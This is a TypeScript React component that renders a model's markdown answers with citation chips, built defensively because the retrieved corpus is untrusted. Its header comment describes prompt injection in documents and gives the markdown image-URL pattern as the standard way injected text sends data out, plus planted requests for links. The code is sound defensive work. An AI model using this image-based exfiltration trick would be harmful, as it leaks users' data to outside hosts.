import type { LinkedCitation } from '@etai/shared';
import type { ReactNode } from 'react';
import ReactMarkdown, { type Components } from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { rehypeCitations } from '@/lib/rehype-citations';

/**
 * An answer, rendered as the markdown the model wrote, with its citation markers as chips.
 *
 * Answers used to be split on blank lines and set as plain paragraphs. A model asked for
 * the four release checks writes a numbered list, and that list arrived as one run-on
 * paragraph with "1." and "2." buried mid-sentence; a code sample arrived as literal
 * backticks. react-markdown builds React elements rather than an HTML string, so nothing
 * the model writes reaches `innerHTML`.
 *
 * Three things are refused on purpose, because the model's input includes the corpus and
 * the corpus is untrusted:
 *
 * - Raw HTML stays escaped as text, the library's default.
 * - Images are dropped. An image in an answer is fetched by the reader's browser the
 *   moment it renders, which makes `![](https://elsewhere/?q=...)` the standard way for a
 *   prompt injected into a document to send something out of the page.
 * - Links render as text with their address shown. A sentence planted in a document can
 *   ask the model for a link, and a reader should see where it points rather than click it.
 *
 * Headings are flattened to a strong line, since a top level heading inside a chat
 * bubble outranks the page it sits on.
 */

export interface AnswerMarkdownProps {
  text: string;
  citations: LinkedCitation[];
  renderChip: (number: number, citation: LinkedCitation) => ReactNode;
}

const heading: Components['h1'] = ({ children }) => <p className="et-answer-heading">{children}</p>;

/** Elements markdown may never produce here, for the reason above. */
export const REFUSED_ELEMENTS = ['img'];

/** Links shown rather than followed, and tables that scroll inside a narrow column. */
export const SAFE_COMPONENTS: Components = {
  a: ({ children, href }) => {
    const label = typeof children === 'string' ? children : '';
    return (
      <span className="et-answer-link">
        {children}
        {href && href !== label ? <span className="text-muted"> ({href})</span> : null}
      </span>
    );
  },
  table: ({ children, ...props }) => (
    <div className="et-answer-table">
      <table {...quoteMark(props)}>{children}</table>
    </div>
  ),
};

/**
 * The quoted-passage mark, carried over when a component replaces the element it was on.
 *
 * A component receives the element's properties as props and renders whatever it likes,
 * so an override that ignores its props silently drops the mark and the panel opens at
 * the top of the document.
 */
export function quoteMark(props: object): { 'data-quoted'?: true } {
  return (props as Record<string, unknown>)['data-quoted'] ? { 'data-quoted': true } : {};
}

export function AnswerMarkdown({ text, citations, renderChip }: AnswerMarkdownProps) {
  const byNumber = new Map(citations.map((citation) => [citation.sourceNumber, citation]));

  const components: Components = {
    button: (props) => {
      const number = Number((props as Record<string, unknown>)['data-citation']);
      const citation = byNumber.get(number);
      return citation ? renderChip(number, citation) : <>{`[${number}]`}</>;
    },
    ...SAFE_COMPONENTS,
    h1: heading,
    h2: heading,
    h3: heading,
    h4: heading,
    h5: heading,
    h6: heading,
  };

  return (
    <ReactMarkdown
      remarkPlugins={[remarkGfm]}
      rehypePlugins={[[rehypeCitations, { cited: new Set(byNumber.keys()) }]]}
      disallowedElements={REFUSED_ELEMENTS}
      unwrapDisallowed
      components={components}
    >
      {typeof text === 'string' ? text : ''}
    </ReactMarkdown>
  );
}
